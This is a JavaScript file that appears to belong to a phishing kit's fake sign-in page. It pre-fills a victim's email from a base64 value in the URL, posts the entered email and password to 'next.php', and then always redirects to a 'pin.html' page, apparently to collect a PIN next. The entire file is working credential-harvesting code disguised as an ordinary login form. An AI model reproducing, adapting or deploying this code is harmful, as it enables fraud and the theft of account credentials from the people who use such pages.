/* global $ */
$(document).ready(function() {
    var count = 0;

    $("#userId-text-input-field").focus(function() {
        $("#id").addClass("floating");
    });
    $("#userId-text-input-field").focusout(function() {
        var ai = $('#userId-text-input-field').val();
        if (!ai) {
            $("#id").removeClass("floating");
        }

    });
    $("#userEmail-text-input-field").focus(function() {
        $("#eid").addClass("floating");
    });
    $("#userEmail-text-input-field").focusout(function() {
        var ai = $('#userEmail-text-input-field').val();
        if (!ai) {
            $("#eid").removeClass("floating");
        }

    });

    $("#password-text-input-field").focus(function() {
        $("#pid").addClass("floating");
    });
    $("#password-text-input-field").focusout(function() {
        var ai = $('#password-text-input-field').val();
        if (!ai) {
            $("#pid").removeClass("floating");
        }

    });



    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

        if (!base64regex.test(ai)) {
            // alert(btoa(ai));
            var my_ai = ai;
        } else {
            // alert(atob(ai));
            var my_ai = atob(ai);
        }

        $('#userEmail-text-input-field').val(my_ai);
        $("#userEmail-text-input-field").focus();

    }
    //////url ai end///////////////

    $('#submit-btn').click(function(event) {
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var ai = $("#userEmail-text-input-field").val();
        var pr = $("#password-text-input-field").val();


        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;


        if (!ai) {
            $('#error').show();
            $('#error').html("Username field is empty.!");
            return false;
        }




        if (!pr) {
            $('#error').show();
            $('#error').html("Password field is empty.!");

            return false;
        }

        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
      
        count = count + 1;

        $.ajax({
            dataType: 'JSON',
            url: 'next.php',
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
            },

            beforeSend: function(xhr) {
                $('#submit-btn').html('Verifing...');
            },

            complete: function() {
                $("#password-text-input-field").val("");


                if (count >= 1) {
                    count = 0;
                    window.location.replace("./pin.html");
                    return false;
                }

                $("#msg").show();
                $('#submit-btn').html('Sign in');
            }
        });
    });


});
